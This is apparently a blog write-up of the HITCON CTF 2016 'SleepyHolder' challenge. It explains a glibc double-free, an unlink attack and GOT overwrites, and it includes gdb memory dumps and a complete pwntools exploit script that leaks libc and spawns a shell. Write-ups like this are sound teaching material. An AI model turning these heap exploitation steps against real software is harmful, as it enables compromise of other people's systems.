---
title: SleepyHolder - HITCON CTF 2016
date: 2019-01-11 22:00:00
categories:
  - Pwn
  - linux
  - heap
tags:
  - CTF
  - write-up
---

Linux GLIBC Heap Exploitation of a Use-after-Free
<!-- excerpt -->

```
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret

```
This challenge involves three chunks of three different sizes, a fastbin size 0x30, a large bin size 0xfb0 and a chunk of size 0x61a80 which gets allocated in a newly maped region.
You can create, free and also edit the chunks, but you cannot view the contents in the chunk.
The humongous chunk can be created once, cannot be freed or renewed thereafter.
All the heap pointers are stored in bss, along with flags that specify if a particular chunk is allocated or not.

The structure would be something like this
```c++
struct data {
	void * big_secret; 
	void * locked_secret;
	void * small_secret;
	int big_flag;
	int lock_flag;
	int small_flag;
}
```
This is what the structure looks like in memory when all the three chunks are allocated. As you can see below the locked chunk has a newly mapped address.
 
```bash
gdb-peda$ 
0x6020b0 <stdout>:    0x00007ffff7dd2620
0x6020b8:    0x0000000000000000
0x6020c0:    0x00000000006038d0
0x6020c8:    0x00007ffff7f7b010
0x6020d0:    0x00000000006038a0
0x6020d8:    0x0000000100000001
0x6020e0:    0x0000000000000001
```

### Checksec
```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

### The vulnerability
The bug is obvious, you can free a chunk more than once, the heap pointers are not erased from the structure and the flags are not checked even if they are cleared after a free.
```c++
// IDA decompilation
puts("Which Secret do you want to wipe?");
puts("1. Small secret");
puts("2. Big secret");
memset(&v2, 0, 4uLL);
read(0, &v2, 4uLL);
v0 = atoi((const char *)&v2);
if ( v0 == 1 )
{
  free(buf);	// not checks before free		
  dword_6020E0 = 0;	// flag cleared, but pointer is not nulled out
}
else if ( v0 == 2 )
{
  free(qword_6020C0);
  dword_6020D8 = 0;
}
```

### Exploit
There are two steps to my exploit.

The first step is to get the small chunk in the fastbin and unsorted bin. These are the steps I followed to accomplish it.
* First allocate small and big chunks, the heap will contain a 0x31 chunk then a 0xfb1 chunk followed by the top chunk.
* Now I free the small chunk, small chunk is now in fastbin and the prev\_inuse bit of the 0xfb1 chunk will be clear and the prev\_size will be 0x30.
* I allocate the locked chunk, this chunk is allocated in a new mapped region as the size is greater than 0x21000. When such a large chunk is allocated, malloc\_consolidate() is called and 0x31 fastbin chunk is moved to the unsorted bin.
* Using the vulnerability, I free the small chunk again, thus the 0x31 chunk is now in fastbin and in unsorted bin.

Now when the I calloc the small chunk, it is allocated from the fastbin, giving me a UAF on the unsorted bin chunk. Remember that the prev\_inuse bit of 0xfb0 is clear, and prev\_size is 0x30. 

The second step of the exploit is to pull off an unlink attack and get a bss pointer above the structure as small\_secret, giving us arbitary write.

```bash
gdb-peda$ x/30gx 0x00603000+0xb70
0x603b70:    0x0000000000000000    0x0000000000000031
0x603b80:    0x0000000000000000    0x00007ffff7dd1b98
0x603b90:    0x0000000000000000    0x0000000000000000
0x603ba0:    0x0000000000000030    0x0000000000000fb0
0x603bb0:    0x0000647361647361    0x0000000000000000
0x603bc0:    0x0000000000000000    0x0000000000000000
0x603bd0:    0x0000000000000000    0x0000000000000000
0x603be0:    0x0000000000000000    0x0000000000000000
0x603bf0:    0x0000000000000000    0x0000000000000000
0x603c00:    0x0000000000000000    0x0000000000000000
0x603c10:    0x0000000000000000    0x0000000000000000
0x603c20:    0x0000000000000000    0x0000000000000000
0x603c30:    0x0000000000000000    0x0000000000000000
0x603c40:    0x0000000000000000    0x0000000000000000
0x603c50:    0x0000000000000000    0x0000000000000000
```
In the current situation if I free the 0xfb0 chunk, the 0x31 chunk and the 0xfb0 chunk will be merged, for this the the 0x31 chunk will be unlinked from the unsorted bin.

`p->FD->BK=BK`

`p->BK->FD=FD`

To do the unlink attack we have to pass the below check, where p is the pointer being unlinked
```c++
mchunkptr fd = p->fd;
mchunkptr bk = p->bk;

if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) 
	malloc_printerr ("corrupted double-linked list");

fd->bk = bk;  // unlink attack
bk->fd = fd;
```
To pass the check, we just need an address pointing to the heap chunk. This is gifted to us with the structure in bss. 0x6020d0 already points to 0x603b80 this case. But the chunk in unsorted bin is 0x603b70, so we can't use bss address to do an unlink attack with the 0x31 chunk. 

When free is called upon the 0xfb0 chunk, the prev\_inuse bit is checked to see if the above chunk is free or not, if it is free the prev\_size is subtracted to get to the above chunk.

Create a fake chunk of 0x21 at 0x603b80 and overwrite the prev\_size to 0x20, now we can set the fake fd and bk such that the security checks are bypassed.

```bash
gdb-peda$ x/30gx 0x00603000+0x620
0x603620:    0x0000000000000000    0x0000000000000031
0x603630:    0x0000000000000000    0x0000000000000021
0x603640:    0x00000000006020b8    0x00000000006020c0
0x603650:    0x0000000000000020    0x0000000000000fb0
0x603660:    0x0000647361647361    0x0000000000000000
0x603670:    0x0000000000000000    0x0000000000000000
0x603680:    0x0000000000000000    0x0000000000000000
0x603690:    0x0000000000000000    0x0000000000000000
```

Free the big chunk now, see the magic happen, the small\_secret in structure will point to 0x6020b8 after unlink.

We now have control over the contents in the structure. Overwrite the big\_secret with desired address and renew its value for arbitary read.

My obvious target was the GOT table as PIE is disabled, two small things left to do; leak libc address and get shell.

To got a leak, I overwrote free\_GOT with puts\_PLT and called free on atoi_GOT, leaking the resolvedlibc function address. 
To get the shell, I overwrote free_GOT with system() and freed a bss pointer to "/bin/sh".


### Here's my exploit code
```python
from pwn import *

s=process("./SleepyHolder.patch",env={'LD_PRELOAD' : './libc.so.6'})
libc=ELF("./libc.so.6")

def keep(ch,content,l=1):
	s.sendlineafter("3. Renew secret",str(1))
	if(l==1):
		s.recvline(4)
	else:
		s.recvline(3)
	s.sendline(str(ch))
	s.sendafter("Tell me your secret:",content)

def wipe(ch):
	s.sendlineafter("3. Renew secret",str(2))
	s.sendlineafter("2. Big secret",str(ch))

def renew(ch,content):
	s.sendlineafter("3. Renew secret",str(3))
	s.sendlineafter("2. Big secret",str(ch))
	s.sendafter("Tell me your secret:",content)

fake_chunk = p64(0x00) + p64(0x21) + p64(0x6020b8) + p64(0x6020c0) +p64(0x20)
atoi_GOT=0x602080
free_GOT=0x602018
puts_PLT=0x400760

# allocate both chunk; fastbin size and large bin size
keep(1,"asdasd")
keep(2,"asdasd")

# free fastbin size and then allocate huge chunk, now the fastbin chunk is in unsorted bin
wipe(1)
keep(3,"sdasd")

# free same chunk again to have it inn fastbin also
wipe(1)

# Allocate it back and create a fake chunk, also set the prev_size of the large chunk
keep(1,fake_chunk)

# Free the large such, unlink will be performed on the fake chunk
wipe(2)

# Small secret now points to address bss address, giving us control over all secret pointers

# Make the free_GOT the big secret, and renew it with puts_PLT
renew(1,p64(0x00) + p64(free_GOT) + p64(0x00) + p64(0x6020b8) + p32(0x1)*3)
renew(2,p64(puts_PLT))

# Now change big secret to atoi_GOT
renew(1,p64(0x00) + p64(atoi_GOT))

# Wipe big secret to get libc address leak
wipe(2)
s.recvline()
libc_base=u64(s.recv(6).ljust(8,"\x00"))-0x36e70
log.info("LIBC LEAK = " + hex(libc_base))
system=libc_base + libc.symbols['system']
log.info("System = " + hex(system))

# Overwite free_GOT with system, write "/bin/sh" in bss and free it.
renew(1,"/bin/sh\x00" + p64(free_GOT) + p64(0x00) + p64(0x6020b8) + p32(0x1)*3)
renew(2,p64(system))
wipe(1)

s.interactive()
```
